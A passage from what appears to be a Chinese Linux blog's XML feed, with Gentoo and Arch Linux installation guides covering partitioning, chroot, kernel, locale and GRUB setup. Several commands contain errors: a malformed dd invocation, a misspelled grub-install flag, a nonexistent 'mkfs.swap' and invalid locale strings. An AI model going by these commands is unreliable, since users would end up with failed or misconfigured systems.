class="hljs-comment">#根据cpu核心数来配置(一般配置为cpu核心数+1),如果机器配置不够尽量将线程数调低一些,方式内存爆.</span><br><br>CHOST=<span class="hljs-string">&quot;x86_64-pc-linux-gnu&quot;</span><br><span class="hljs-comment">#--keep-going表示portage在编译软件出错的时候继续进行编译--with-bdeps表示在碰上依赖的时候一起安装上依赖</span><br>EMERGE_DEFAULT_OPTS=<span class="hljs-string">&quot;--jobs=8 --load-average=7.2 --ask --keep-going --with-bdeps=y&quot;</span><br>GRUB_PLATFORMS=<span class="hljs-string">&quot;efi-64&quot;</span> <span class="hljs-comment">#配置GRUB架构平台</span><br>CPU_FLAGS_X86=<span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">#使用cpuflags查看cpu参数</span><br><span class="hljs-comment">#设置语言</span><br>L10N=<span class="hljs-string">&quot;en-US en&quot;</span><br>LINGUAS=<span class="hljs-string">&quot;en-US en&quot;</span><br><br><span class="hljs-comment">#镜像源</span><br>NETEASE=<span class="hljs-string">&quot;https://mirrors.163.com/gentoo/&quot;</span><br>NEUSOFT=<span class="hljs-string">&quot;https://mirrors.neusoft.edu.cn/gentoo/&quot;</span><br>TSINGHUA=<span class="hljs-string">&quot;https://mirrors.tuna.tsinghua.edu.cn/gentoo/&quot;</span><br>CDS=<span class="hljs-string">&quot;http://mirrors.yun-idc.com/gentoo/&quot;</span><br>ALI=<span class="hljs-string">&quot;https://mirrors.aliyun.com/gentoo/&quot;</span><br>BIT=<span class="hljs-string">&quot;https://mirror.bit.edu.cn/gentoo/&quot;</span><br>USTC=<span class="hljs-string">&quot;https://mirrors.ustc.edu.cn/gentoo/&quot;</span><br><br><br>AUTO_CLEAN=<span class="hljs-string">&quot;yes&quot;</span><br><span class="hljs-comment">#设置自动清理</span><br>VIDEO_CARDS=<span class="hljs-string">&quot;intel nvidia&quot;</span><span class="hljs-comment">#配置显卡驱动</span><br>INPUT_DEVICES=<span class="hljs-string">&quot;libinput&quot;</span>            <span class="hljs-comment">#配置输入设备的基本库</span><br><span class="hljs-comment">#将microcode直接编译进内核</span><br>MICROCODE_SIGNATURES=<span class="hljs-string">&quot;-S&quot;</span><br>LC_MESSAGES=C<br><br><br>PORTDIR=<span class="hljs-string">&quot;/var/db/repos/gentoo&quot;</span>      <span class="hljs-comment">#软件包的ebuild文件存储目录</span><br>DISTDIR=<span class="hljs-string">&quot;/var/cache/distfiles&quot;</span><br>PKGDIR=<span class="hljs-string">&quot;/var/cache/binpkgs&quot;</span>         <span class="hljs-comment">#软件包的存储目录</span><br><span class="hljs-comment">#设置软件包缓存目录</span><br>PORTAGE_TMPDIR=<span class="hljs-string">&quot;/tmp&quot;</span>               <span class="hljs-comment">#portage的编译目录</span><br><span class="hljs-comment">#设置portage构建软件包目录(如果内存较大,建议设置在内存里面)</span><br><span class="hljs-comment"># This sets the language of build output to English.</span><br><span class="hljs-comment"># Please keep this setting intact when reporting bugs.</span><br>LC_MESSAGES=C<br>GENTOO_MIRRORS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;USTC&#125;</span>&quot;</span>            <span class="hljs-comment">#配置Gentoo镜像源(软件镜像源)</span><br><span class="hljs-comment">#全局USE</span><br>USE=<span class="hljs-string">&quot;-X -qt5 &quot;</span><br></code></pre></td></tr></table></figure><h5 id="2-配置gentoo软件仓库"><a href="#2-配置gentoo软件仓库" class="headerlink" title="2.配置gentoo软件仓库"></a>2.配置gentoo软件仓库</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建存放gentoo仓库配置文件的目录</span><br><span class="hljs-built_in">mkdir</span> --parents /mnt/gentoo/etc/portage/repos.conf<br><br><span class="hljs-comment">#将gentoo软件仓库配置模板拷贝至上述创建的目录下</span><br><span class="hljs-built_in">cp</span> /mnt/gentoo/usr/share/portage/config/repos.conf /mnt/gentoo/etc/portage/repos.conf/gentoo.conf<br></code></pre></td></tr></table></figure><p>配置仓库镜像源(获取ebuild的镜像源)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nano /mnt/gentoo/etc/portage/repos.conf/gentoo.conf<br></code></pre></td></tr></table></figure><p>将镜像源换成国内的中科大gentoo源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[DEFAULT]<br>main-repo = gentoo<br> <br>[gentoo]<br>location = /var/db/repos/gentoo<br>sync-type = rsync<br>sync-uri = rsync://mirrors.ustc.edu.cn/gentoo-portage<br>auto-sync = <span class="hljs-built_in">yes</span><br>sync-rsync-verify-jobs = 1<br>sync-rsync-verify-metamanifest = <span class="hljs-built_in">yes</span><br>sync-rsync-verify-max-age = 24<br>sync-openpgp-key-path = /usr/share/openpgp-keys/gentoo-release.asc<br>sync-openpgp-key-refresh-retry-count = 40<br>sync-openpgp-key-refresh-retry-overall-timeout = 1200<br>sync-openpgp-key-refresh-retry-delay-exp-base = 2<br>sync-openpgp-key-refresh-retry-delay-max = 60<br>sync-openpgp-key-refresh-retry-delay-mult = 4<br></code></pre></td></tr></table></figure><h5 id="3-挂载必要的文件系统"><a href="#3-挂载必要的文件系统" class="headerlink" title="3.挂载必要的文件系统"></a>3.挂载必要的文件系统</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置dns解析文件</span><br><span class="hljs-built_in">cp</span> --dereference /etc/resolv.conf /mnt/gentoo/etc/resolv.conf<br><br>mount --types proc /proc /mnt/gentoo/proc<br>mount --rbind /sys /mnt/gentoo/sys<br>mount --make-rslave /mnt/gentoo/sys<br>mount --rbind /dev /mnt/gentoo/dev<br>mount --make-rslave /mnt/gentoo/dev<br><span class="hljs-comment">#假如用的不是gentoo的livecd,需要加入以下</span><br><span class="hljs-built_in">test</span> -L /dev/shm &amp;&amp; <span class="hljs-built_in">rm</span> /dev/shm &amp;&amp; <span class="hljs-built_in">mkdir</span> /dev/shm<br>mount --types tmpfs --options nosuid,nodev,noexec shm /dev/shm<br><span class="hljs-built_in">chmod</span> 1777 /dev/shm<br></code></pre></td></tr></table></figure><h5 id="4-进入到新的系统进行基本系统配置"><a href="#4-进入到新的系统进行基本系统配置" class="headerlink" title="4.进入到新的系统进行基本系统配置"></a>4.进入到新的系统进行基本系统配置</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chroot</span> /mnt/gentoo /bin/bash<br><span class="hljs-built_in">source</span> /etc/profile<br><span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot)<span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><h4 id="8-开始整个系统的编译"><a href="#8-开始整个系统的编译" class="headerlink" title="8.开始整个系统的编译"></a>8.开始整个系统的编译</h4><h5 id="8-1-获取ebuild快照"><a href="#8-1-获取ebuild快照" class="headerlink" title="8.1.获取ebuild快照"></a>8.1.获取ebuild快照</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">emerge-webrsync<br></code></pre></td></tr></table></figure><h5 id="8-2-获取系统的配置文件"><a href="#8-2-获取系统的配置文件" class="headerlink" title="8.2.获取系统的配置文件"></a>8.2.获取系统的配置文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root <span class="hljs-comment">#eselect profile list</span><br><br>Available profile symlink targets:<br>  [1]   default/linux/amd64/17.1 *<br>  [2]   default/linux/amd64/17.1/desktop<br>  [3]   default/linux/amd64/17.1/desktop/gnome<br>  [4]   default/linux/amd64/17.1/desktop/kde<br></code></pre></td></tr></table></figure><h5 id="8-3-安装一些常用的软件"><a href="#8-3-安装一些常用的软件" class="headerlink" title="8.3.安装一些常用的软件"></a>8.3.安装一些常用的软件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">emerge --ask app-portage/cpuid2cpuflags<span class="hljs-comment">#用于查看cpu参数,可以将参数配置到portage配置文件中使得可以针对cpu参数进行优化</span><br></code></pre></td></tr></table></figure><h5 id="8-4-配置USE-x2F-etc-x2F-portage-x2F-package-use-x2F-特定软件包-x2F-etc-x2F-portage-x2F-make-conf全局USE"><a href="#8-4-配置USE-x2F-etc-x2F-portage-x2F-package-use-x2F-特定软件包-x2F-etc-x2F-portage-x2F-make-conf全局USE" class="headerlink" title="8.4.配置USE(&#x2F;etc&#x2F;portage&#x2F;package.use&#x2F;*特定软件包,&#x2F;etc&#x2F;portage&#x2F;make.conf全局USE)"></a>8.4.配置USE(&#x2F;etc&#x2F;portage&#x2F;package.use&#x2F;*特定软件包,&#x2F;etc&#x2F;portage&#x2F;make.conf全局USE)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-devel/gcc cet pgo go lto nptl -objc -objc++ -objc-gc -fixed-point -d<br>sys-devel/gdb cet lzma multitarget python server source-highlight xml xxhash<br>sys-devel/clang static-analyzer<br>dev-lang/python -bluetooth -wininst<br>net-analyze/nmap nse nping ncat libssh2<br>app-containers/docker btrfs cli apparmor aufs container-init device-mapper overlay<br>app-editors/vim cscope racket -X -crypt  -terminal<br>net-misc/wget cookie-check<br>net-wireless/wpa_supplicant ap -broadcom-sta -crda eap-sim -eapol-test -mesh -p2p<br>openjdk -headless-awt<br>git blksha1 -cgi -highlight -webdav -mediawiki -mediawiki-experimental -perforce subversion -tk<br>openssh X509 hpn ldns livecd scp ssl xmss security-key<br></code></pre></td></tr></table></figure><h5 id="8-5-设置时间和地区"><a href="#8-5-设置时间和地区" class="headerlink" title="8.5.设置时间和地区"></a>8.5.设置时间和地区</h5><p>配置时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<span class="hljs-comment">#将时间配置到上海时区</span><br>hwclock --systohc<span class="hljs-comment">#同步时间</span><br></code></pre></td></tr></table></figure><p>配置语言和地区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#/etc/locale.gen</span><br>en_US.UTF-8 UTF-8<br>zh_CN.UTF-8 UTF-8<br>locale-gen<br><br><span class="hljs-comment">#列出所有可用的locale</span><br>root <span class="hljs-comment">#eselect locale list</span><br><br>Available targets <span class="hljs-keyword">for</span> the LANG variable:<br>  [1]  C<br>  [2]  C.utf8<br>  [3]  en_US<br>  [4]  en_US.iso88591<br>  [5]  en_US.utf8<br>  [6]  de_DE<br>  [7]  de_DE.iso88591<br>  [8]  de_DE.iso885915<br>  [9]  de_DE.utf8<br>  [10] POSIX<br>  [ ]  (free form)<br><br><span class="hljs-comment">#设置locale</span><br>root <span class="hljs-comment">#eselect locale set 9</span><br></code></pre></td></tr></table></figure><p>配置主机名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hostnamectl set-hostname Gentoo<br></code></pre></td></tr></table></figure><p>配置hosts文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/hosts<br><span class="hljs-comment"># This defines the current system and must be set</span><br>127.0.0.1     tux.homenetwork tux localhost<br>  <br><span class="hljs-comment"># Optional definition of extra systems on the network</span><br>192.168.0.5   jenny.homenetwork jenny<br>192.168.0.6   benny.homenetwork benny<br></code></pre></td></tr></table></figure><h5 id="8-6-安装linux-firmware和microcode"><a href="#8-6-安装linux-firmware和microcode" class="headerlink" title="8.6.安装linux-firmware和microcode"></a>8.6.安装linux-firmware和microcode</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">emerge --ask --verbose sys-kernel/linux-firmware sys-firmware/intel-microcode<br><span class="hljs-comment">#sys-kernel/linux-firmware      包含了一些常用的驱动</span><br><span class="hljs-comment">#sys-firmware/intel-microcode   用于更新microcode,以保持系统的稳定性</span><br></code></pre></td></tr></table></figure><h5 id="8-7-编译内核"><a href="#8-7-编译内核" class="headerlink" title="8.7.编译内核"></a>8.7.编译内核</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取内核源码</span><br>emerge --ask sys-kernel/gentoo-sources sys-kernel/dracut sys-apps/pciutils<br><br><span class="hljs-comment">#sys-kernel/gentoo-sources 为内核源码</span><br><span class="hljs-comment">#sys-kernel/dracut用与生成initramfs</span><br><span class="hljs-comment">#sys-apps/pciutils软件包用于收集硬件信息(一些pci设备)</span><br><br><span class="hljs-comment">#列出当前可用内核</span><br>eselect kernel list<br><br><span class="hljs-comment">#设置使用那个内核</span><br>eselect kernel <span class="hljs-built_in">set</span><br><br><span class="hljs-comment">#编译内核</span><br><span class="hljs-comment">#进入内核目录</span><br><span class="hljs-built_in">cd</span> /usr/src/linux<br><br><span class="hljs-comment">#开始编译</span><br><br><span class="hljs-comment">#配置编译选项</span><br>make menuconfig<br><br><span class="hljs-comment">#开始编译</span><br>make -j8 &amp;&amp; make modules_install -j8<br><br><span class="hljs-comment">#安装内核</span><br>make install <br><br><span class="hljs-comment">#生成一个initramfs</span><br>dracut --kver=4.9.16-gentoo<br><span class="hljs-comment">#记得打开frame_buffer(大坑)。</span><br></code></pre></td></tr></table></figure><h5 id="8-8-系统基本使用的软件"><a href="#8-8-系统基本使用的软件" class="headerlink" title="8.8.系统基本使用的软件"></a>8.8.系统基本使用的软件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">emerge --ask --verbose net-wireless/iw net-wireless/wpa_supplicant  net-misc/dhcp net-dns/dnsmasq sys-boot/grub:2 app-editors/vim sys-boot/efibootmgr<br><span class="hljs-comment">#net-wireeless/iw               一个网络管理工具</span><br><span class="hljs-comment">#net-wireless/wpa-supplicant    wifi连接工具</span><br><span class="hljs-comment">#net-misc/networkmanager        网络管理工具</span><br><span class="hljs-comment">#net-misc/dhcp                  dhcp客户端</span><br><span class="hljs-comment">#net-misc/dnsmasq               dns服务器以及dhcp服务器</span><br><span class="hljs-comment">#app-admin/sysklogd             日志分析工具</span><br><span class="hljs-comment">#sys-boot/grub:2                grub(一种bootloader)</span><br><span class="hljs-comment">#app-editors/vim vim编辑器</span><br><span class="hljs-comment">#sys-boot/efibootmgruefi系统引导必要的</span><br></code></pre></td></tr></table></figure><h5 id="8-9-更新系统"><a href="#8-9-更新系统" class="headerlink" title="8.9.更新系统"></a>8.9.更新系统</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">emerge --ask --verbose --deep --newuse --update @world<br></code></pre></td></tr></table></figure><h4 id="9-配置系统引导"><a href="#9-配置系统引导" class="headerlink" title="9.配置系统引导"></a>9.配置系统引导</h4><p>生成fstab文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#生成fstab文件</span><br>blkid<br><span class="hljs-comment">#如果使用的archlinux的livecd,可以使用archlinux的genfstab自动生成fstab文件</span><br><span class="hljs-comment">#genfstab /mnt/gentoo &gt; /mnt/gentoo/etc/fstab</span><br><br><span class="hljs-comment">#建议使用uuid</span><br>blkid &gt;&gt; /etc/fstab<br>修改/etc/fstab文件<br>UUID=<span class="hljs-string">&quot;203C-2BDD&quot;</span>        /boot   vfat    defaults 0 1<br>UUID=<span class="hljs-string">&quot;5afdfbc9-0c66-4a13-8f29-da00199af5de&quot;</span> /   ext4 defaults defaults,noatime,discard 0 2<br><br></code></pre></td></tr></table></figure><p>这里默认使用的引导是grub2,也可以使用其他的系统引导如lilo uboot等</p><p>生成grub配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /boot/grub<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><p>安装系统引导</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grub-install --taget=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo<br></code></pre></td></tr></table></figure><h4 id="10-完成安装"><a href="#10-完成安装" class="headerlink" title="10.完成安装"></a>10.完成安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#设置root用户的密码</span><br>passwd root<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux发行版安装与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux安装步骤</title>
    <link href="/2022/04/10/Archlinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/04/10/Archlinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Archlinux安装步骤"><a href="#Archlinux安装步骤" class="headerlink" title="Archlinux安装步骤"></a>Archlinux安装步骤</h1><h2 id="1-获取镜像-制作启动盘"><a href="#1-获取镜像-制作启动盘" class="headerlink" title="1.获取镜像,制作启动盘"></a>1.获取镜像,制作启动盘</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://mirrors.ustc.edu.cn/archlinux/iso/2022.03.01/archlinux-2022.03.01-x86_64.iso<br><span class="hljs-comment">#linux下面可以使用dd进行刻录</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span> ./archlinux.iso of=/dev/sda<br><span class="hljs-comment">#windows下可以使用rufus进行刻录</span><br></code></pre></td></tr></table></figure><h3 id="2-基本安装环境配置"><a href="#2-基本安装环境配置" class="headerlink" title="2.基本安装环境配置"></a>2.基本安装环境配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#1.使用以太网,直接dhcpcd获取ip地址即可</span><br>2.使用Wi-Fi<br><span class="hljs-comment">#进入网络配置</span><br>iwctl<br><span class="hljs-comment">#扫面周围的wifi</span><br>station wlan0 scan<br><span class="hljs-comment">#显示扫描到的wifi</span><br>station wlan0 get-networks<br><span class="hljs-comment">#连接指定的Wi-Fi</span><br>station wlan0 connect SSID<br><br><br><span class="hljs-comment">#启动时间服务</span><br>timedatectl set-ntp <span class="hljs-literal">true</span><br><span class="hljs-comment">#同步时间</span><br>hwclock --systohc<br></code></pre></td></tr></table></figure><h2 id="3-磁盘分区和挂载"><a href="#3-磁盘分区和挂载" class="headerlink" title="3.磁盘分区和挂载"></a>3.磁盘分区和挂载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用fdisk工具进行磁盘分区</span><br>fdisk /dev/sda<br><br><br><span class="hljs-comment">#格式化文件系统</span><br>mkfs.ext4 /dev/sda3     <span class="hljs-comment">#格式化根文件系统分区</span><br>mkfs.swap /dev/sda2     <span class="hljs-comment">#格式化swap分区</span><br>mkfs.vfat /dev/sda1     <span class="hljs-comment">#格式化boot文件系统分区</span><br><br><span class="hljs-comment">#分区挂载</span><br>mount /dev/sda3 /mnt<br><span class="hljs-built_in">mkdir</span> /mnt/boot<br>mount /dev/sda1 /mnt/boot<br>swapon /dev/sda2<br></code></pre></td></tr></table></figure><h2 id="4-安装基础系统"><a href="#4-安装基础系统" class="headerlink" title="4.安装基础系统"></a>4.安装基础系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacstrap /mnt base linux linux-firmware<br><span class="hljs-comment">#base为系统基本组件</span><br><span class="hljs-comment">#linux为linux内核</span><br><span class="hljs-comment">#linux-firmware包含了常见的设备驱动</span><br></code></pre></td></tr></table></figure><h2 id="5-进入安装好的系统-进行基本的系统配置"><a href="#5-进入安装好的系统-进行基本的系统配置" class="headerlink" title="5.进入安装好的系统,进行基本的系统配置"></a>5.进入安装好的系统,进行基本的系统配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#生成fstab文件</span><br>genfstab /mnt &gt;&gt; /mnt/etc/fstab<br><br><span class="hljs-comment">#chroot 到新的系统</span><br>arch-chroot /mnt<br></code></pre></td></tr></table></figure><h3 id="5-1-设置hostname和host"><a href="#5-1-设置hostname和host" class="headerlink" title="5.1.设置hostname和host"></a>5.1.设置hostname和host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Arch&quot;</span> &gt; /etc/hostname<br>vim /etc/hosts<br>127.0.0.1   localhost<br>::1         localhost<br>127.0.1.1   archlinux.localdomain<br></code></pre></td></tr></table></figure><h3 id="5-2-设置时间-地区和语言"><a href="#5-2-设置时间-地区和语言" class="headerlink" title="5.2.设置时间,地区和语言"></a>5.2.设置时间,地区和语言</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#设置时区</span><br><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br><br><span class="hljs-comment">#配置语言</span><br>vim /etc/lcoale.gen<br>en_US.UTF-8.UTF-8<br>zh_CN.UTF-8.UTF-8<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;LANG=en_US.UTF-8.UTF-8&quot;</span> &gt; /etc/locale.conf<br>locale-gen<br></code></pre></td></tr></table></figure><h3 id="5-3-安装系统常用的基本软件"><a href="#5-3-安装系统常用的基本软件" class="headerlink" title="5.3.安装系统常用的基本软件"></a>5.3.安装系统常用的基本软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S wpa_supplicant dhcpcd neovim <br><span class="hljs-comment">#wpa_supplicant是wifi连接工具</span><br><span class="hljs-comment">#dhcpcd是获取ip地址的dhcp客户端工具</span><br><span class="hljs-comment">#neovim是一个常用的编辑器</span><br></code></pre></td></tr></table></figure><h2 id="6-安装系统引导"><a href="#6-安装系统引导" class="headerlink" title="6.安装系统引导"></a>6.安装系统引导</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装grub软件包</span><br>pacman -S grub<br><br><span class="hljs-comment">#安装grub</span><br>grub-install --target=x86_64-efi --efi-directory=/boot<br><br><span class="hljs-comment">#生成grub配置文件</span><br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><h2 id="7-完成安装"><a href="#7-完成安装" class="headerlink" title="7.完成安装"></a>7.完成安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#设置root用户密码</span><br>passwd root<br><br><span class="hljs-comment">#退出chroot环境</span><br><span class="hljs-built_in">exit</span><br><br><span class="hljs-comment">#卸载磁盘</span><br>umount /mnt/boot<br>umount /mnt<br><br><span class="hljs-comment">#重启系统并移除安装介质</span><br>reboot<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux发行版安装与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/1970/01/01/v2ray%E9%85%8D%E7%BD%AE/"/>
    <url>/1970/01/01/v2ray%E9%85%8D%E7%BD%AE/</url>
    
